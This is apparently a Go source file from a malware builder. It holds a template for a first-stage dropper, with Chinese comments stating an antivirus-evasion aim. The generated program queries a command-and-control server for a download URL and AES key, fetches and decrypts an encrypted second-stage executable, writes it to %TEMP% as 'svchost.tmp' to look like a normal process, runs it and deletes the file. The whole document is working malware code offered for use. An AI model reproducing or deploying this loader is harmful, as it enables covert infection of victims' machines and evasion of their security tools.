package builder

// stage1Template 是 Stage1 引导器的源码模板。
// Stage1 是一个极小的可执行文件，仅负责：
//  1. 连接 C2 /api/stage 获取 stage2 的下载 URL + AES 密钥
//  2. 从外部 URL 下载加密的 stage2（AES-GCM 加密）
//  3. AES-GCM 解密为明文 PE
//  4. 写入 %TEMP% 目录
//  5. CreateProcess 执行
//
// 设计理念：轻量 + 静态免杀
//  - 不注入内存，不调用 VirtualAlloc 执行 shellcode
//  - 只使用标准库
//  - 无 CGO 依赖
const stage1Template = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

const c2Base = {{printf "%q" .C2URL}}

func main() {
	c2URL := c2Base + "/api/stage"

	// 1. 从 C2 获取 stage2 下载信息
	resp, err := http.Get(c2URL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return
	}

	var info struct {
		DownloadURL string ` + "`json:\"download_url\"`" + `
		AESKeyHex   string ` + "`json:\"aes_key\"`" + `
	}
	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
		return
	}
	if info.DownloadURL == "" || info.AESKeyHex == "" {
		return
	}

	// 2. 从外部 URL 下载加密 stage2
	dlResp, err := http.Get(info.DownloadURL)
	if err != nil {
		return
	}
	defer dlResp.Body.Close()
	if dlResp.StatusCode != 200 {
		return
	}
	encrypted, err := io.ReadAll(dlResp.Body)
	if err != nil {
		return
	}

	// 3. AES-GCM 解密
	key, err := hex.DecodeString(info.AESKeyHex)
	if err != nil {
		return
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}
	nonceSize := gcm.NonceSize()
	if len(encrypted) < nonceSize {
		return
	}
	nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
	stage2, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return
	}

	// 4. 写入 %TEMP% 目录
	tmpDir := os.Getenv("TEMP")
	if tmpDir == "" {
		tmpDir = os.TempDir()
	}
	outPath := filepath.Join(tmpDir, "svchost.tmp")
	if err := os.WriteFile(outPath, stage2, 0600); err != nil {
		return
	}

	// 5. 执行 stage2（伪装为正常进程）
	cmd := exec.Command(outPath)
	cmd.Stdout = nil
	cmd.Stderr = nil
	_ = cmd.Start()
	os.Remove(outPath)
}
`
